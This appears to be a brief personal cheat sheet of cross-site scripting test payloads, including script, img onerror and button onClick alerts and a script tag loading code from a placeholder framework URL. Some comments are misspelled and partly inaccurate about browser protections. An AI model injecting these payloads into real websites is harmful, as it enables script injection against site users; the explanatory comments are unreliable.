//basic alert message to know if web site is vulnerable to xss
//this method will not work since browers have security agains it
<script>alert("hacked");</script>

//methods that can work in this case
<img src="img.png" onerror="alert('hacked')"/>
<button onClick="alert('hacked')"></button>

//explotation useing a framework
<script src="framworkurl"></script>